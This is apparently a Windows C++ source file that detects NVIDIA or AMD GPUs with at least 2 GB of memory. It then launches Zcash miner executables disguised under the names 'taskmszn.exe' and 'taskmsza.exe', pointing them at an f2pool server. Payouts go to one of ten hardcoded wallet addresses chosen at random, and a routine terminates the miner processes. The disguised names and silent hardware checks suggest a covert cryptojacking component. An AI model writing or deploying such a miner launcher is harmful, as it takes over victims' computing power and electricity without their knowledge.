#include "stdafx.h"

#include "CheckEnvironment.h"
#include <Tlhelp32.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include "Utility/PeeIdHelper.h"
//#include "commonshare\md5.h"
//#include "Utility\StringOperation.h"

bool RunEnvironment::CheckEnvironment()
{
	if (CheckZcashNCond())
	{
		m_Type = vendor_t::nvidia;
		return true;
	}
	else if (CheckZcashACond())
	{
		m_Type = vendor_t::amd;
		return true;
	}
	return false;
}



void RunEnvironment::GetRunCmd(std::wstring &wstrCmd)
{
	TCHAR szExePath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szExePath, MAX_PATH);
	PathRemoveFileSpec(szExePath);
	
	GetClientInfo();

	TCHAR szLaunchExe[MAX_PATH] = {0}; 
	PathCombine(szLaunchExe,szExePath,m_pClientInfo->strClientSubPath.c_str());

	if (::PathFileExists(szLaunchExe))
	{
		TCHAR szCmdLine[MAX_PATH] = {0};
		_sntprintf(szCmdLine, _MAX_PATH, L"%s %s", szLaunchExe,m_pClientInfo->strClientParam.c_str());
		wstrCmd = szCmdLine;
	}
}

std::wstring RunEnvironment::GetRandomAccount()
{
	TCHAR szAccountList[][MAX_PATH] = {
		L"t1S3tJRg6acb8VPjTzKopv3uLQ4m23upNQw",
		L"t1dDo9o34PLiZXmbAQDYk5oYJvPYiqKPLQ8",
		L"t1cPfRjB7J24yPqbtmNyRPLB9oCmkVr4aXf",
		L"t1LBkJGtSQkw85P1Lz2ZEeY5c57HPYALUUY",
		L"t1fuT3LVRqpmZvg3sJEjNX9Yq5MwZ8ZDxnA",
		L"t1dHSsBPgDbZSnazMpdKnfDRgKEJKkF865D",
		L"t1KxEuvHoD7TyedE1JJ6ZX1j1e8aRfEVCek",
		L"t1UhGXRSucqeQd3HN9otziZcieabYSNG1xn",
		L"t1e3SNxrS9gbZoM3c2GDYKRNfLoPk63PraF",
		L"t1LsNkrQAHwm3nUynfszmrWxfgGPVmfYLyx",	
	};
	int len = ARRAYSIZE(szAccountList);
	srand( (unsigned)time( NULL ) );
	int index =  rand()%ARRAYSIZE(szAccountList);
	return szAccountList[index];
}

void RunEnvironment::GetWorkID()
{
	std::wstring wstrPeerID;
	GetPeerId_(wstrPeerID);

	std::string strPeerID = ultra::_T2A(wstrPeerID);
	wchar_t pszMD5[MAX_PATH] = {0};

	if (GetStringMd5(strPeerID,pszMD5) && wcslen(pszMD5) >= 8)
	{
		m_wstrWorkID = ultra::ToLower(std::wstring(pszMD5,8));
	}
	else
	{
		m_wstrWorkID = L"00000000";
	}
}

void RunEnvironment::GetClientInfo()
{
	GetWorkID();
	std::wstring strFormat = L"";
	std::wstring strAccount = GetRandomAccount();
	std::wstring strWorkid = L"";
	m_pClientInfo = new CLIENT_INFO();
	if (m_Type == vendor_t::nvidia)
	{
		strFormat = L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec";
		strWorkid = L"n0";
		m_pClientInfo->strClientSubPath = L"taskmszn\\taskmszn.exe";
	}
	else if (m_Type == vendor_t::amd)
	{
		strFormat = L"-zpool zec.f2pool.com:3357 -zwal %s.%s -zpsw x -li 10 -dbg -1";
		strWorkid = L"a0";
		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
	}
	TCHAR szParam[MAX_PATH] = {0};
	_sntprintf(szParam, _MAX_PATH, strFormat.c_str(), strAccount.c_str(),strWorkid.c_str());
	m_pClientInfo->strClientParam = szParam;
}


bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_CARD_INFO)
{
	if (LoadLibraryA("opencl32.dll") == NULL)
	{
		TSDEBUG4CXX("[GetUserDisplayCardInfo] load opencl fail, nErrorCode = "<< GetLastError());
		return false;  
	}

	GetDisplayCardInfo(vDISPLAY_CARD_INFO);
	return true;  
};

bool RunEnvironment::CheckZcashNCond()
{
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= 2000000000)
		{
			TSDEBUG4CXX(L"can do Zcash N");
			return true;
		}
	}
	return false;
}


bool RunEnvironment::CheckZcashACond()
{
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZcashNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= 2000000000)
		{
			TSDEBUG4CXX(L"can do Zcash A");
			return true;
		}
	}
	return false;
}


void RunEnvironment::TerminateAllClientInstance()
{
	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		BOOL bResult = ::Process32First(hSnap, &pe);
		while (bResult)
		{
			if(	(_tcsicmp(pe.szExeFile, L"taskmszn.exe") == 0 && pe.th32ProcessID != 0)
				|| (_tcsicmp(pe.szExeFile, L"taskmsza.exe") == 0 && pe.th32ProcessID != 0)
				)
			{
				HANDLE hProcess = ::OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
				::TerminateProcess(hProcess, 99);
			}
			bResult = ::Process32Next(hSnap, &pe);
		}
		::CloseHandle(hSnap);
	}
}